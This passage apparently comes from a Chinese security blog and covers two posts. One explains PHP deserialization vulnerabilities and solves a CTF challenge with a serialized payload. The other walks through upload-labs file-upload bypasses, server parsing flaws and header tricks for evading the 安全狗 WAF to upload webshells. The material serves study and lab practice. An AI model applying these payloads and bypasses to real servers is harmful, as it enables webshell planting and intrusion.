    public $name = &quot;Twe1ve&quot;;    
    private $sex = &quot;Male&quot;;
}
$Tw_n = new Tw;
$ser = serialize($Tw_n);
echo $ser;
echo &quot;&lt;/br&gt;&quot;;
echo urlencode($ser);
?&gt;输出结果如下：
O:2:&quot;Tw&quot;:2:{s:4:&quot;name&quot;;s:6:&quot;Twe1ve&quot;;s:7:&quot;Twsex&quot;;s:4:&quot;Male&quot;;}
O%3A2%3A%22Tw%22%3A2%3A%7Bs%3A4%3A%22name%22%3Bs%3A6%3A%22Twe1ve%22%3Bs%3A7%3A%22%00Tw%00sex%22%3Bs%3A4%3A%22Male%22%3B%7DO:2:Tw:2:   O代表存储的是对象(object),a的话则代表数组，2指代对象名称有两个字符，Tw则是对象名,2则代表有两个值
{s:4:”name”;s:6:”Twe1ve”;s:7:”Twsex”;s:4:”Male”;}   {}内为属性字符数：属性值；s表示字符串，由于private属性会在类名两侧加入空字节，所以此处Twsex的名称长度7，实际为%00Tw%00sex
unserialize(): [存在private属性的类，需要先将原有的序列化值urlencode输出，再进行反序列化]
&lt;?php
$str = &apos;O%3A2%3A%22Tw%22%3A2%3A%7Bs%3A4%3A%22name%22%3Bs%3A6%3A%22Twe1ve%22%3Bs%3A7%3A%22%00Tw%00sex%22%3Bs%3A4%3A%22Male%22%3B%7D&apos;;
$data = urldecode($str);
$unser = unserialize($data);
var_dump($unser);
?&gt;结果：
object(__PHP_Incomplete_Class)[1]
  public &apos;__PHP_Incomplete_Class_Name&apos; =&gt; string &apos;Tw&apos; (length=2)
  public &apos;name&apos; =&gt; string &apos;Twe1ve&apos; (length=6)
  private &apos;sex&apos; (Tw) =&gt; string &apos;Male&apos; (length=4)在反序列化对象之后，需要当前作用域中存在该类的定义，否则php无法将类对应到指定类
可以看到，当定义域中不存在该类时会反序列化出一个__PHP_Incomplete_Class的类，也就是一个不完整的类
其次，在反序列化的过程中，只保存原有类的变量值，并不会保存其函数，具体的函数功能是根据定义域中定义好的函数功能来执行
&lt;?php
class Tw{
    public $name = &quot;Twe1ve&quot;;    
    private $sex = &quot;Male&quot;;
}
$str = &apos;O%3A2%3A%22Tw%22%3A2%3A%7Bs%3A4%3A%22name%22%3Bs%3A6%3A%22Twe1ve%22%3Bs%3A7%3A%22%00Tw%00sex%22%3Bs%3A4%3A%22Male%22%3B%7D&apos;;
$data = urldecode($str);
$unser = unserialize($data);
var_dump($unser);
?&gt;结果：
object(Tw)[1]
  public &apos;name&apos; =&gt; string &apos;Twe1ve&apos; (length=6)
  private &apos;sex&apos; =&gt; string &apos;Male&apos; (length=4)利用构造函数等魔术方法（Magic function）：

__construct()：构造函数，当对象创建(new)时会自动调用。但在unserialize()时是不会自动调用的。
__destruct()：析构函数，类似于C++。会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行，当对象被销毁时会自动调用。
__wakeup()：如前所提，unserialize()时会检查是否存在 __wakeup()，如果存在，则会优先调用 __wakeup()方法。
__toString():用于处理一个类被当成字符串时应怎样回应，因此当一个对象被当作一个字符串时就会调用。
__sleep():用于提交未提交的数据，或类似的清理操作，因此当一个对象被序列化的时候被调用。
…..

魔术方法执行顺序：__wakeup()&gt; __toString()&gt; __destruct()
漏洞利用1、直接调用，危险函数直接在类中被调用
class cls{
   var $value = &apos;echo 123;&apos;;
   function action(){
eval($this-&gt;value);
}
}
$a = unserialize(&apos;O:3:&quot;cls&quot;:1:{s:5:&quot;value&quot;;s:10:&quot;phpinfo();&quot;;}&apos;);
$a-&gt;action();2、危险函数在魔术方法中
class cls{
var $value = &apos;echo 123;&apos;;
function __wakeup(){
eval($this-&gt;value);
}
}
$a = unserialize(&apos;O:3:&quot;cls&quot;:1:{s:5:&quot;value&quot;;s:10:&quot;phpinfo();&quot;;}&apos;);3、危险函数在其他类中被调用
当一个类中的成员变量是另一个类，且调用了另一个类中的危险函数。此时就可以序列化前者类，从而触发触发漏洞
&lt;?php
class cls1{
var $ser;
function __construct(){
$ser = new ser2();
}
function __wakeup(){
$this-&gt;ser-&gt;evil();
}
}
class cls2{
var $value = &quot;echo 123;&quot;;
function evil(){
eval($this-&gt;value);
}
}
$cls = $GET[&apos;cls&apos;];
$instance = unserialize($cls);
?&gt;exp：
&lt;?php
class cls1{
  var $ser;
function __construct(){
   $this-&gt;ser = new cls2();
   }
}
class cls2{
var $value = &apos;phpinfo();&apos;;
}
print_r(serialize(new cls1()))

?&gt;第二届网鼎杯反序列化题目：
&lt;?php
include(&quot;flag.php&quot;);
highlight_file(__FILE__);
class FileHandler {
protected $op;
protected $filename;
protected $content;
function __construct() {
    $op = &quot;1&quot;;
    $filename = &quot;/tmp/tmpfile&quot;;
    $content = &quot;Hello World!&quot;;
    $this-&gt;process();
}
public function process() {
    if($this-&gt;op == &quot;1&quot;) {
        $this-&gt;write();
    } else if($this-&gt;op == &quot;2&quot;) {
        $res = $this-&gt;read();
        $this-&gt;output($res);
    } else {
        $this-&gt;output(&quot;Bad Hacker!&quot;);
    }
}
private function write() {
    if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) {
        if(strlen((string)$this-&gt;content) &gt; 100) {
            $this-&gt;output(&quot;Too long!&quot;);
            die();
        }
        $res = file_put_contents($this-&gt;filename, $this-&gt;content);
        if($res) $this-&gt;output(&quot;Successful!&quot;);
        else $this-&gt;output(&quot;Failed!&quot;);
    } else {
        $this-&gt;output(&quot;Failed!&quot;);
    }
}
private function read() {
    $res = &quot;&quot;;
    if(isset($this-&gt;filename)) {
        $res = file_get_contents($this-&gt;filename);
    }
    return $res;
}
private function output($s) {
    echo &quot;[Result]:
&quot;;
    echo $s;
}
function __destruct() {
    if($this-&gt;op === &quot;2&quot;)
        $this-&gt;op = &quot;1&quot;;
    $this-&gt;content = &quot;&quot;;
    $this-&gt;process();
}
}
function is_valid($s) {
for($i = 0; $i &lt; strlen($s); $i++)
    if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))
        return false;
return true;
}
if(isset($_GET{&apos;str&apos;})) {
$str = (string)$_GET[&apos;str&apos;];
if(is_valid($str)) {
    $obj = unserialize($str);
}
}is_valid : 判断传入字符是否为可打印字符，由于这里的属性均为protected，会生成 %00，但是由于php7对类的修饰不敏感，直接把属性改为public可绕过
__destruct中为强类型比较，还会讲$op置1，process读取文件，需要让$op为2，由于process使用==弱类型比较，直接让$op=2绕过
&lt;?php
class FileHandler {
public $op = 2 ;
public $filename = &quot;flag.php&quot; ;
}
$class = new FileHandler();
$ser = serialize($class);
echo $ser;
?&gt;O:11:”FileHandler”:2:{s:2:”op”;i:2;s:8:”filename”;s:8:”flag.php”;}
链接：https://www.kingkk.com/2018/07/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/
https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/
https://xz.aliyun.com/t/3674


</section>
    <p class="sub">May 24, 2020</p>
  </div>
</div>-->
<!---->
<!--  <div class="project-card">
  
  <div class="ctnWrap">
    <a href="/2020/05/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" class="title">文件上传漏洞学习</a>
    <section class="desc">
  *上传函数： *
move_upload_file()关于PHP中$_FILES数组的使用方法: 

$_FILES[‘file’][‘name’] 客户端文件名称
$_FILES[‘file’][‘type’] 文件的MIME类型
$_FILES[‘file’][‘size’] 文件大小 单位字节
$_FILES[‘file’][‘tmp_name’] 文件被上传后再服务器端临时文件名，可以在php.ini中指定

1、未过滤或前端过滤，upload_labs-pass 1
&lt;script type=&quot;text/javascript&quot;&gt;
function checkFile() {
    var file = document.getElementsByName(&apos;upload_file&apos;)[0].value;
    if (file == null || file == &quot;&quot;) {
        alert(&quot;请选择要上传的文件!&quot;);
        return false;
    }
    //定义允许上传的文件类型
    var allow_ext = &quot;.jpg|.png|.gif&quot;;
    //提取上传文件的类型
    var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));
    //判断上传文件类型是否允许上传
    if (allow_ext.indexOf(ext_name) == -1) {
        var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;
        alert(errMsg);
        return false;
    }
}
&lt;/script&gt;2、content-type验证绕过pass-2：
if (($_FILES[&apos;upload_file&apos;][&apos;type&apos;] == &apos;image/jpeg&apos;) || ($_FILES[&apos;upload_file&apos;][&apos;type&apos;]== &apos;image/png&apos;) || ($_FILES[&apos;upload_file&apos;][&apos;type&apos;] == &apos;image/gif&apos;)) {
    $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
    $img_path = UPLOAD_PATH . &apos;/&apos; . $_FILES[&apos;upload_file&apos;][&apos;name&apos;];        这里仅仅对content-type进行验证，burpsuit抓包之后修改content-type类型即可绕过
3、黑名单限制后缀名绕过pass-3
if (file_exists(UPLOAD_PATH)) {
    $deny_ext = array(&apos;.asp&apos;,&apos;.aspx&apos;,&apos;.php&apos;,&apos;.jsp&apos;);
    $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);
    $file_name = deldot($file_name);//删除文件名末尾的点
    $file_ext = strrchr($file_name, &apos;.&apos;);
    $file_ext = strtolower($file_ext); //转换为小写
    $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA
    $file_ext = trim($file_ext); //收尾去空
    if(!in_array($file_ext, $deny_ext)) {
        $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
        $img_path = UPLOAD_PATH.&apos;/&apos;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;    
黑名单过滤不全面，php3、php5、phhtml等后缀绕过
黑名单过滤不全面，由于这里不限制.htaccess，可通过上传一个.htaccess重写文件解析规则

pass-4   
$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;);
   $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);
   $file_name = deldot($file_name);//删除文件名末尾的点
   $file_ext = strrchr($file_name, &apos;.&apos;);
   $file_ext = strtolower($file_ext); //转换为小写
   $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA
   $file_ext = trim($file_ext); //收尾去空
   if(!in_array($file_ext, $deny_ext)) {
       $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
       $img_path = UPLOAD_PATH.&apos;/&apos;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;     
黑名单过滤相对较全，但是没有将后缀进行大小写统一，可通过大小写绕过
黑名单过滤不全面，由于这里不限制.htaccess，可通过上传一个.htaccess重写文件解析规则

pass-5：       
$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);
$file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);
$file_name = deldot($file_name);//删除文件名末尾的点
$file_ext = strrchr($file_name, &apos;.&apos;);
$file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA
$file_ext = trim($file_ext); //首尾去空
if(!in_array($file_ext, $deny_ext)) {
    $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
    $img_path = UPLOAD_PATH.&apos;/&apos;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;黑名单过滤较全，但是没有将后缀进行大小写统一，可通过大小写绕过
pass-6：   
if (file_exists(UPLOAD_PATH)) {
    $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);
    $file_name = $_FILES[&apos;upload_file&apos;][&apos;name&apos;];
    $file_name = deldot($file_name);//删除文件名末尾的点
    $file_ext = strrchr($file_name, &apos;.&apos;);
    $file_ext = strtolower($file_ext); //转换为小写
    $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA
    if(!in_array($file_ext, $deny_ext)) {
        $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
        $img_path = UPLOAD_PATH.&apos;/&apos;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;同样还是黑名单，但是没有对后缀名去空出来，后缀名加空格绕过
pass-7（系统特性绕过）       
$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);
$file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);
$file_ext = strrchr($file_name, &apos;.&apos;);
$file_ext = strtolower($file_ext); //转换为小写
$file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA
$file_ext = trim($file_ext); //首尾去空
if(!in_array($file_ext, $deny_ext)) {
    $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
    $img_path = UPLOAD_PATH.&apos;/&apos;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;同样还是黑名单，但是没有对后缀名去 . 处理；由于在windows中会自动去掉后缀名中末尾的 .  , 即在后缀名末尾加 . 可绕过
pass-8:（系统特性绕过）   
if (file_exists(UPLOAD_PATH)) {
 $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);
 $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);
 $file_name = deldot($file_name);//删除文件名末尾的点
 $file_ext = strrchr($file_name, &apos;.&apos;);
 $file_ext = strtolower($file_ext); //转换为小写
 $file_ext = trim($file_ext); //首尾去空
 if(!in_array($file_ext, $deny_ext)) {
     $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
     $img_path = UPLOAD_PATH.&apos;/&apos;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;同样还是黑名单,但是没有对后缀名进行去”::$DATA”处理，利用windows特性，可在后缀名中加” ::$DATA”绕过
pass-9:
$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);
    $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);
    $file_name = deldot($file_name);//删除文件名末尾的点
    $file_ext = strrchr($file_name, &apos;.&apos;);
    $file_ext = strtolower($file_ext); //转换为小写
    $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA
    $file_ext = trim($file_ext); //首尾去空

    if (!in_array($file_ext, $deny_ext)) {
        $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
        $img_path = UPLOAD_PATH.&apos;/&apos;.$file_name;黑名单过滤很全面，但是同样利用windows特性，构造paylaod， shell.php. .  
pass-10:  
if (file_exists(UPLOAD_PATH)) {
    $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);
    $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);
    $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);
    $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
    $img_path = UPLOAD_PATH.&apos;/&apos;.$file_name;  黑名单过滤，将黑名单后缀替换为空，可双写后缀名绕过
4、白名单后缀名绕过pass-11：
$ext_arr = array(&apos;jpg&apos;,&apos;png&apos;,&apos;gif&apos;);
$file_ext = substr($_FILES[&apos;upload_file&apos;][&apos;name&apos;],strrpos($_FILES[&apos;upload_file&apos;][&apos;name&apos;],&quot;.&quot;)+1);
if(in_array($file_ext,$ext_arr)){
    $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
    $img_path = $_GET[&apos;save_path&apos;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;$img_path采用拼接方式，可通过路径名截断绕过，burpsuit抓包，上传shell.png,save_path改成../upload/11.php%00

访问http://127.0.0.1/upload/shell.php
%00截断利用条件：

需满足 php 版本&lt;5.3.4
php.ini中的magic_quotes_gpc是off状态的,受限于addslasheshes函数

pass-12:    
$ext_arr = array(&apos;jpg&apos;,&apos;png&apos;,&apos;gif&apos;);
$file_ext = substr($_FILES[&apos;upload_file&apos;][&apos;name&apos;],strrpos($_FILES[&apos;upload_file&apos;][&apos;name&apos;],&quot;.&quot;)+1);
if(in_array($file_ext,$ext_arr)){
    $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
    $img_path = $_POST[&apos;save_path&apos;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;与pass-11不同的时这里使用POST形式传入save_path,由于POST不能对%00自动解码，需要使用0x00进行绕过
上传shell.png,save_path改成../upload/11.php+  ; 使用 + 是为了方便定位，一直+ 对应的hex为2b，直接修改2b为00即可

访问 http://127.0.0.1/upload/shell.php

其实两个截断的原理都是0x00是字符串的结束标识符，且需要注意的是0x00截断的使用是在路径上！！！！！
pass-19也同样使用路径拼接的方式，同理，在save_name使用0x00截断即可绕过白名单但是不采取路径拼接的情况下应该考虑,htaccess解析规则和解析漏洞
5、文件头检查绕过pass-13：    
$file = fopen($filename, &quot;rb&quot;);
$bin = fread($file, 2); //只读2字节
fclose($file);
$strInfo = @unpack(&quot;C2chars&quot;, $bin);    
$typeCode = intval($strInfo[&apos;chars1&apos;].$strInfo[&apos;chars2&apos;]);    
$fileType = &apos;&apos;;    
switch($typeCode){      
    case 255216:            
        $fileType = &apos;jpg&apos;;
        break;
    case 13780:            
        $fileType = &apos;png&apos;;
        break;        
    case 7173:            
        $fileType = &apos;gif&apos;;
        break;
    default:            
        $fileType = &apos;unknown&apos;;
    }    
    return $fileType;检验文件头，手动添加 GIF89a即可绕过；pass-14 、pass-15同理
6、条件竞争绕过pass-17:     
   $ext_arr = array(&apos;jpg&apos;,&apos;png&apos;,&apos;gif&apos;);
$file_name = $_FILES[&apos;upload_file&apos;][&apos;name&apos;];
$temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
$file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1);
$upload_file = UPLOAD_PATH . &apos;/&apos; . $file_name;


if(move_uploaded_file($temp_file, $upload_file)){
    if(in_array($file_ext,$ext_arr)){
         $img_path = UPLOAD_PATH . &apos;/&apos;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;
         rename($upload_file, $img_path);
         $is_upload = true;
    }else{
        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;
        unlink($upload_file);
    }在if判断之前，已经move_uploaded_file将文件上传到目录中，如果后缀不在白名单内再删除，此时利用竞争条件争在保存文件后删除文件前来执行php文件在burpsuit不断发包，然后网页不断刷新访问


既然能执行命令，那么可以通过执行命令写一个webshell,pass-18同样是条件竞争
upload_labs:这里面比较通杀的方法是采用aaa.php:jpg 的方法生成一个aaa.php的空文件，然后使用aaa.&lt;&lt;&lt;再次写入文件内容。
7、解析漏洞绕过Apache1.X 2.X解析漏洞：Apache在以上版本中，解析文件名的方式是从后向前识别扩展名，直到遇见Apache可识别的扩展名为止。shell.php.jpg  —&gt;被解析为php脚本执行
IIS6.0中两个解析缺陷：（iis6.0 默认的可执行文件除了asp还包含这三种asa、cer、cdx） 
目录名包含.asp、.asa、.cer的话，则该目录下的所有文件都将按照asp解析执行     
xxx.jpg在xxx.asp目录下，xxx.jpg则按照asp解析执行文件名中如果包含.asp;、.asa;、.cer;则优先使用asp解析（这是因为在IIS6.0下，分号后面的不被解析）    xx.asp;.jpg被解析为asp脚本执行
Nginx解析漏洞： 

Nginx 0.5.* 
Nginx 0.6.* 
Nginx 0.7 &lt;= 0.7.65 
Nginx 0.8 &lt;= 0.8.37

以上Nginx容器的版本下，上传一个在waf白名单之内扩展名的文件shell.jpg，然后以shell.jpg.php进行请求。
IIS 7.0/Nginx0.8.41–1.5.6畸形解析漏洞
上传一个在waf白名单之内扩展名的文件shell.jpg，然后以shell.jpg/.php进行请求。
PHP CGI解析漏洞：
IIS 7.0/7.5Nginx &lt; 0.8.3以上的容器版本中默认php配置文件cgi.fix_pathinfo=1时，上传一个存在于白名单的扩展名文件shell.jpg，在请求时以shell.jpg/shell.php请求，会将shell.jpg以php来解析
多个Content-Disposition：
在IIS的环境下，上传文件时如果存在多个Content-Disposition的话，IIS会取第一个Content-Disposition中的值作为接收参数，而如果waf只是取最后一个的话便会被绕过
8、iconv函数限制上传在iconv转码的过程中,utf-&gt;gb2312(其他部分编码之间转换同样存在这个问题)会导致字符串被截断，如：
$filename=”shell.php(hex).jpg”;(hex为0x80-0x99)，经过iconv转码后会变成$filename=”shell.php “;
9、双文件上传：上传点支持多文件上传，但是却只对第一个文件做了过滤
f12找到上传的post表单，action属性是指定上传检测页面，补全url: https://www.xxx.com/xxx.php(asp)，
然后构造本地post提交表单第一个文件上传正常文件，第二个文件上传我们想要上传的webshell等
10、waf缺陷绕过安全狗4.0：
文件名回车绕过：（在文件名中插入特殊符号：分号、空格、单引号、换行符）
filename=&quot;shell.php&quot;
或者
filename=&quot;shell.php&quot;==绕过：（===同样也可以过）
filename==&quot;shell.php&quot;双写filename=;绕过
filename=;filename=&quot;shell.php&quot;%00截断 在文件名后面加上%00然后CTRL+SHIFT+U转成字符，这里后面不用加.jpg也可以
filename=&quot;shell.php .jpg&quot;上传文件的Content-Disposition扩展头字段在filename前插入任意字符长度?=508即可绕过安全狗上传任意后缀
原因是文件Content-Disposition字段的长度验证不准确
x*508;filename=&quot;shell.php&quot;垃圾字符填充：
filename=&quot;%20*500+1.php&quot;修改头特征：
去掉form-data
原：
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.php&quot;
bypass：
Content-Disposition: name=&quot;file&quot;; filename=&quot;shell.php&quot;(form-data;的意思是内容描述，form-data的意思是来自表单的数据，但是即使不写form-data，apache也接受。)或者更改form-data为一些不相关的值；
还可以增加额外的头进行干扰
Content-Type: image/gif
